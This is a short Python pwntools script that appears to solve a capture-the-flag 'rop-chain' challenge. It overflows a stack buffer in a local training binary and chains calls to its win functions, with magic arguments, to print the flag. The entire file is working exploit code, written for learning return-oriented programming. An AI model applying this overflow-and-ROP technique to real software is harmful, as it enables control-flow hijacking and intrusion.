#! /usr/bin/env python
from pwn import process, p32, u32, context, log
from pwn import ELF, ROP
context.clear(arch='i386', os='linux')


def main():
    elf_name = '/problems/rop-chain_2_d25a17cfdcfdaa45844798dd74d03a47/rop'
    elf = ELF(elf_name)
    offset_buf_to_eip = 0x18 + 4

    p = process(elf_name)

    rop_chain = ROP(elf)
    rop_chain.win_function1()
    rop_chain.win_function2(0xBAAAAAAD)
    rop_chain.flag(0xDEADBAAD)

    log.info(rop_chain.dump())

    payload = 'A' * offset_buf_to_eip
    payload += str(rop_chain)
    assert('\n' not in payload)
    p.sendlineafter('input> ', payload)

    print(p.recv(4096))


if __name__ == "__main__":
    main()
